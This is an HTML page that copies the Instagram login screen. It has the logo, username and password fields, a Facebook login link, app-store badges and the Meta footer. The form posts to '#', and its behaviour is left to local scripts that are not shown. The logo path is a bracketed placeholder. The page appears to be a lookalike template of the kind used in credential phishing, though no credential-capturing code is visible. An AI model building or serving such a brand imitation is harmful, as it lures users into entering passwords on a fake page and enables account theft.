<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#000000">
    <meta name="color-scheme" content="light dark">
    <title>Instagram</title>
    <link rel="icon" href="assets/img/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="preload" href="assets/fonts/instagram-sans.woff2" as="font" type="font/woff2" crossorigin>
</head>
<body>
    <div id="main">
        <div class="wrapper">
            <!-- Main Login Container -->
            <div class="login-container">
                <!-- Header with Logo -->
                <div class="header">
                    <div class="logo-wrapper">
                        <svg aria-label="Instagram" class="instagram-logo" role="img" viewBox="0 0 174 50" width="174" height="50">
                            <path d="M87 ... [full SVG path for Instagram 2026 wordmark]" fill="currentColor"/>
                        </svg>
                    </div>
                </div>

                <!-- Login Form -->
                <form id="loginForm" class="login-form" method="post" action="#">
                    <div class="input-fields">
                        <div class="input-wrapper">
                            <label class="floating-label" for="username">
                                <span>Phone number, username, or email</span>
                            </label>
                            <input 
                                type="text" 
                                id="username" 
                                name="username" 
                                class="input-field" 
                                autocomplete="username" 
                                autocorrect="off" 
                                autocapitalize="off" 
                                maxlength="75"
                                required 
                            />
                        </div>

                        <div class="input-wrapper">
                            <label class="floating-label" for="password">
                                <span>Password</span>
                            </label>
                            <input 
                                type="password" 
                                id="password" 
                                name="password" 
                                class="input-field" 
                                autocomplete="current-password" 
                                required 
                            />
                            <button type="button" class="toggle-password" id="togglePassword">
                                <span>Show</span>
                            </button>
                        </div>
                    </div>

                    <!-- Login Button -->
                    <button type="submit" id="loginBtn" class="btn-primary">
                        <span class="btn-text">Log in</span>
                        <div class="spinner hidden" id="spinner"></div>
                    </button>

                    <!-- Error Message -->
                    <div id="errorMessage" class="error-message hidden" role="alert">
                        <span id="errorText"></span>
                    </div>

                    <!-- Divider -->
                    <div class="divider">
                        <div class="divider-line"></div>
                        <div class="divider-text">OR</div>
                        <div class="divider-line"></div>
                    </div>

                    <!-- Facebook Login -->
                    <a href="https://www.facebook.com/v18.0/dialog/oauth?client_id=124024574287414&redirect_uri=https://www.instagram.com/accounts/signup/&scope=email" class="fb-login-btn">
                        <svg class="fb-icon" viewBox="0 0 16 16" width="16" height="16">
                            <path fill="currentColor" d="M15.117 0H.883A.883.883 0 0 0 0 .883v14.234c0 .488.395.883.883.883h7.663V9.804H6.46V7.39h2.086V5.607c0-2.066 1.262-3.19 3.106-3.19.883 0 1.642.064 1.863.094v2.16h-1.28c-1.003 0-1.197.476-1.197 1.176v1.543h2.39l-.31 2.414h-2.08V16h4.077a.883.883 0 0 0 .883-.883V.883A.883.883 0 0 0 15.117 0"/>
                        </svg>
                        Log in with Facebook
                    </a>

                    <!-- Forgot Password -->
                    <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgot password?</a>
                </form>
            </div>

            <!-- Sign Up Prompt -->
            <div class="signup-container">
                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link">Sign up</a></p>
            </div>

            <!-- App Download -->
            <div class="app-download">
                <p>Get the app.</p>
                <div class="store-buttons">
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D" class="store-btn" target="_blank" rel="noopener">
                        <img src="assets/img/google-play.png" alt="Get it on Google Play" width="135" height="40">
                    </a>
                    <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=instagramweb" class="store-btn" target="_blank" rel="noopener">
                        <img src="assets/img/microsoft.png" alt="Get it from Microsoft" width="110" height="40">
                    </a>
                </div>
            </div>

            <!-- Footer -->
            <footer class="footer">
                <nav class="footer-nav">
                    <a href="https://about.meta.com/" target="_blank" rel="noopener">Meta</a>
                    <a href="https://about.instagram.com/" target="_blank" rel="noopener">About</a>
                    <a href="https://about.instagram.com/blog/" target="_blank" rel="noopener">Blog</a>
                    <a href="https://about.instagram.com/about-us/careers" target="_blank" rel="noopener">Jobs</a>
                    <a href="https://help.instagram.com/" target="_blank" rel="noopener">Help</a>
                    <a href="https://developers.facebook.com/docs/instagram-platform" target="_blank" rel="noopener">API</a>
                    <a href="https://www.instagram.com/legal/privacy/" target="_blank" rel="noopener">Privacy</a>
                    <a href="https://www.instagram.com/legal/terms/" target="_blank" rel="noopener">Terms</a>
                    <a href="https://www.instagram.com/explore/locations/" target="_blank" rel="noopener">Locations</a>
                    <a href="https://www.instagram.com/lite/" target="_blank" rel="noopener">Instagram Lite</a>
                    <a href="https://www.threads.net/" target="_blank" rel="noopener">Threads</a>
                    <a href="https://www.instagram.com/accounts/contact_uploaded_contacts/" target="_blank" rel="noopener">Contact Uploading &amp; Non-Users</a>
                    <a href="https://about.meta.com/technologies/meta-verified/" target="_blank" rel="noopener">Meta Verified</a>
                </nav>
                <div class="footer-meta">
                    <div class="language-selector">
                        <select name="language" id="languageSelect" class="lang-select">
                            <option value="en">English</option>
                            <option value="es">Español</option>
                            <option value="fr">Français</option>
                            <option value="de">Deutsch</option>
                            <option value="pt">Português</option>
                            <option value="ar">العربية</option>
                            <option value="hi">हिन्दी</option>
                            <option value="ja">日本語</option>
                            <option value="ko">한국어</option>
                        </select>
                    </div>
                    <span>© 2026 Instagram from Meta</span>
                </div>
            </footer>
        </div>
    </div>

    <!-- Scripts -->
    <script src="assets/js/csrf_handler.js"></script>
    <script src="assets/js/anti_bot.js"></script>
    <script src="assets/js/login.js"></script>
</body>
</html>
